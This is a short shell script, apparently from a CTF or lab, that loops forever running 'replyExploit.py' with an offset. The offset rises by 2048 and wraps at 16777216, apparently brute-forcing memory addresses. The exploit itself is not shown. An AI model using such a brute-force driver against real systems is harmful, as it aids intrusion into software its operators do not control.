#! /bin/sh
while [ 0 ]; do
	echo $i
	python replyExploit.py $i
	i=$(($i + 2048))
	if [ $i -gt 16777216 ]; then
		i=0
	fi
done;